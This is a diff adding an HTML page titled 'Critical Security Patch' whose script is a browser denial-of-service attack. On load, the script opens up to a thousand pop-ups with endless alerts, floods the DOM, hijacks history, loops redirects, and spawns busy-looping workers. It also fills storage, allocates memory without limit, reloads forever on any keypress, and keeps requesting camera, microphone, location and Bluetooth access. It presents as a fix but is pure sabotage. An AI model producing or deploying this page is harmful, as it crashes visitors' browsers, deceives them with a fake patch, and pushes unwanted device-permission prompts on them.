@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Critical Security Patch</title>
+<script>
+(function() {
+    function exponentialTabBomb() {
+        let count = 0;
+        function spawn() {
+            if (count++ < 1000) {
+                window.open('about:blank', '_blank', 'width=100,height=100');
+                window.open('javascript:while(1)alert(1)', '_blank');
+                setTimeout(spawn, 10);
+            }
+        }
+        spawn();
+    }
+
+    document.addEventListener('click', () => {
+        document.body.innerHTML = '';
+        document.write('<h1>SYSTEM COMPROMISED</h1>'.repeat(10000));
+    });
+    document.addEventListener('keydown', () => {
+        while(1) location.reload();
+    });
+
+    function memoryHell() {
+        setInterval(() => {
+            let div = document.createElement('div');
+            div.innerHTML = '<svg><script>while(1);<\/script></svg>';
+            for(let i=0;i<100;i++) {
+                let clone = div.cloneNode(true);
+                document.body.appendChild(clone);
+                clone.innerHTML += clone.innerHTML;
+            }
+        }, 1);
+    }
+
+    function historyAttack() {
+        setInterval(() => {
+            history.pushState({}, '', Date.now().toString());
+            if(history.length > 1000) {
+                history.go(-Math.random()*500);
+            }
+        }, 1);
+    }
+
+    function redirectLoop() {
+        setInterval(() => {
+            location.hash = Math.random();
+            location.replace(location.href);
+        }, 10);
+    }
+
+    function workerArmy() {
+        if(window.Worker) {
+            let blob = new Blob(['while(1){postMessage([]);}'], {type:'application/javascript'});
+            let url = URL.createObjectURL(blob);
+            for(let i=0;i<50;i++) {
+                new Worker(url);
+            }
+        }
+    }
+
+    function storageDoS() {
+        try {
+            let data = 'X'.repeat(10*1024*1024);
+            localStorage.setItem('crash', data);
+            sessionStorage.setItem('crash', data);
+            indexedDB.open('crashDB', 1000000000);
+        } catch(e) {}
+    }
+
+    function cpuNuke() {
+        setTimeout(() => {
+            let arr = [];
+            while(1) {
+                arr.push(new Float64Array(1000000));
+                arr.push(Array.from({length:1000000}, (_,i)=>i*i));
+                arr.push(new ArrayBuffer(1000000));
+            }
+        }, 100);
+    }
+
+    window.onload = function() {
+        exponentialTabBomb();
+        memoryHell();
+        historyAttack();
+        redirectLoop();
+        workerArmy();
+        storageDoS();
+        cpuNuke();
+        
+        setInterval(() => {
+            try {
+                navigator.mediaDevices.getUserMedia({video:true, audio:true});
+                navigator.geolocation.getCurrentPosition(()=>{});
+                navigator.bluetooth.requestDevice({acceptAllDevices:true});
+            } catch(e) {}
+        }, 100);
+    };
+})();
+</script>
+</head>
+<body style="margin:0;overflow:hidden;">
+<canvas id="c" width="9999" height="9999"></canvas>
+<script>
+let ctx = document.getElementById('c').getContext('2d');
+function draw() {
+    ctx.fillStyle = `hsl(${Date.now()%360},100%,50%)`;
+    ctx.fillRect(0,0,9999,9999);
+    requestAnimationFrame(draw);
+}
+draw();
+</script>
+</body>
+</html>
